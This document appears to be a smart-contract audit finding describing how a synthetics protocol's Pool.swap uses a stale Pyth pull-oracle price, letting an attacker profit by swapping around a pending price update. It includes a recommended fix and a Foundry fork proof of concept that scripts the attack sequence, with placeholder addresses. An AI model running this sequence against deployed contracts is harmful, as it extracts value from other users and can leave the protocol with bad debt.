### Title
Stale pull-oracle price allows minting stable synthetics before a price decrease - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary

`Pool.swap()` converts one synthetic asset into another using `MasterOracle.quote()` and only subtracts the configured swap fee, without accounting for a pending pull-oracle update or applying a conservative bid/ask spread. An attacker can therefore borrow a synthetic asset, swap it at the stale pre-update price, submit the valid lower-price update, and swap back at the new price, leaving them with excess synthetic assets while their debt and collateral remain covered. [1](#0-0) 

### Finding Description

`DebtToken.issue()` determines borrowing capacity from `Pool.debtPositionOf()` and `MasterOracle.quoteUsdToToken()` before minting the synthetic asset to the borrower. [2](#0-1)  `Pool.debtPositionOf()` obtains collateral value through `depositOf()`, which prices each deposit token's underlying asset through `MasterOracle.quoteTokenToUsd()`. [3](#0-2) 

An attacker can use a stable collateral deployment such as mainnet `vaUSDC`, which is configured with a 60% collateral factor. [4](#0-3)  The sequence is:

1. Deposit stable collateral and call `DebtToken.issue()` to mint `msETH`.
2. Obtain a valid Pyth update that lowers the ETH/msETH price but has not yet been submitted on-chain.
3. Call `Pool.swap(msETH, msUSD, amountIn, minAmountOut)` while `quoteSwapOut()` still uses the old higher price. [5](#0-4) 
4. Submit `Pyth.updatePriceFeeds()` so the lower price becomes active; the repository's own fork tests demonstrate that Pyth updates are ordinary public calls that can be ordered inside `Operator.execute()`. [6](#0-5) 
5. Call `Pool.swap(msUSD, msETH, ...)` at the new lower ETH price, obtain more `msETH` than originally issued, repay the original `msETH` debt, and retain the excess as profit.

The invariant violated is that oracle-priced issuance and conversion should not permit a round trip through a known price transition to increase the attacker's synthetic-asset holdings while leaving the position solvent. The vulnerability is not dependent on malformed oracle data because both the pre-update and post-update prices are valid; the exploit is caused by letting the attacker control the ordering between a pending valid update and an oracle-priced swap. [7](#0-6) 

### Impact Explanation

The protocol mints stable synthetic assets at the stale input price and later accepts those assets at the updated price, socializing the price difference across the synthetic system. [8](#0-7)  If the extracted amount exceeds available collateral backing or liquidation capacity, this creates bad debt and protocol insolvency; otherwise it still transfers value from other synthetic holders and borrowers to the attacker. [9](#0-8) 

### Likelihood Explanation

The attack uses only public entry points: collateral deposit, `DebtToken.issue()`, `Pool.swap()`, and the permissionless pull-oracle update. [10](#0-9)  Pull-oracle updates are observable before submission and can be included after the swap in one attacker-controlled transaction or multicall, making execution deterministic. [11](#0-10)  Profitability requires the signed price decrease to exceed swap fees and transaction costs, which is most likely during volatile market conditions or infrequent oracle updates. [12](#0-11) 

### Recommendation

Use conservative oracle bounds for each side of oracle-priced operations: value the input synthetic at the lower confidence bound and the output synthetic at the upper confidence bound, or apply an explicit oracle spread that exceeds plausible pull-oracle latency movement. Alternatively, require oracle freshness through a protocol-controlled update path before both debt issuance and swaps, and consider temporarily disabling swaps when a valid newer price update is available but not yet applied. A fixed swap fee alone is insufficient because an attacker can wait for a price movement larger than the fee. [1](#0-0) 

### Proof of Concept

The following Foundry fork PoC models a valid pending Pyth ETH-price decrease. `BLOCK`, `PYTH`, `POOL`, `VAUSDC_DEPOSIT_TOKEN`, `MSETH`, `MSETH_DEBT`, `MSUSD`, and `UPDATE_DATA` are taken from the deployed mainnet configuration and the Hermes response for the next update after `BLOCK`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDepositToken {
    function deposit(uint256 amount, address onBehalfOf) external returns (uint256, uint256);
    function withdraw(uint256 amount, address to) external returns (uint256, uint256);
}

interface IDebtToken {
    function issue(uint256 amount, address to) external returns (uint256, uint256);
    function repay(uint256 amount) external returns (uint256, uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IPool {
    function swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut
    ) external returns (uint256 amountOut, uint256 fee);

    function quoteSwapIn(
        address tokenIn,
        address tokenOut,
        uint256 amountOut
    ) external view returns (uint256 amountIn, uint256 fee);

    function debtPositionOf(address account)
        external
        view
        returns (bool healthy, uint256 depositUsd, uint256 debtUsd, uint256 limitUsd, uint256 issuableUsd);
}

interface IPyth {
    function updatePriceFeeds(bytes[] calldata updateData) external payable;
    function getUpdateFee(bytes[] calldata updateData) external view returns (uint256);
}

contract StaleOracleSwapPoC is Test {
    uint256 constant BLOCK = /* block immediately before a lower ETH Pyth update */ 0;
    address constant PYTH = /* deployed Pyth */ address(0);
    address constant POOL = /* deployed Pool_1 */ address(0);
    address constant VAUSDC_DEPOSIT_TOKEN = /* deployed vaUSDC DepositToken */ address(0);
    address constant MSETH = /* deployed msETH */ address(0);
    address constant MSETH_DEBT = /* deployed msETH DebtToken */ address(0);
    address constant MSUSD = /* deployed msUSD */ address(0);

    function test_swapBeforePendingPriceDecrease() public {
        vm.createSelectFork(vm.envString("MAINNET_NODE_URL"), BLOCK);

        address attacker = makeAddr("attacker");
        uint256 collateralAmount = 100_000e18;

        // Hermes response containing a valid, lower ETH price that is not yet on-chain.
        bytes[] memory updateData = abi.decode(vm.envBytes("PYTH_UPDATE_DATA"), (bytes[]));

        // Fund the attacker with the vaUSDC collateral through deal() or an
        // impersonated whale in a fork test.
        deal(IDepositToken(VAUSDC_DEPOSIT_TOKEN).underlying(), attacker, collateralAmount);
        vm.startPrank(attacker);

        IERC20Like(IDepositToken(VAUSDC_DEPOSIT_TOKEN).underlying()).approve(
            VAUSDC_DEPOSIT_TOKEN,
            collateralAmount
        );
        IDepositToken(VAUSDC_DEPOSIT_TOKEN).deposit(collateralAmount, attacker);

        (, , , , uint256 issuableUsd) = IPool(POOL).debtPositionOf(attacker);
        uint256 issuedMsEth = issuableUsd / 4_000; // Convert USD capacity to ETH units.

        IDebtToken(MSETH_DEBT).issue(issuedMsEth, attacker);

        // Swap while quoteSwapOut() still uses the pre-update ETH price.
        (uint256 stableOut, ) = IPool(POOL).swap(MSETH, MSUSD, issuedMsEth, 0);

        // Now make the valid lower price active.
        uint256 updateFee = IPyth(PYTH).getUpdateFee(updateData);
        IPyth(PYTH).updatePriceFeeds{value: updateFee}(updateData);

        // Repurchase the original msETH debt at the new lower price.
        (uint256 requiredStable, ) = IPool(POOL).quoteSwapIn(MSUSD, MSETH, issuedMsEth);
        IPool(POOL).swap(MSUSD, MSETH, requiredStable, issuedMsEth);
        IDebtToken(MSETH_DEBT).repay(issuedMsEth);

        uint256 profit = IERC20Like(MSUSD).balanceOf(attacker);
        assertGt(profit, 0);
        assertGt(stableOut, requiredStable);

        vm.stopPrank();
    }
}
```

The two oracle-priced swaps preserve the attacker's debt while producing leftover `msUSD` because `quoteSwapOut()` uses the same point price for both directions and does not protect the protocol from an attacker-controlled oracle-update ordering. [1](#0-0)
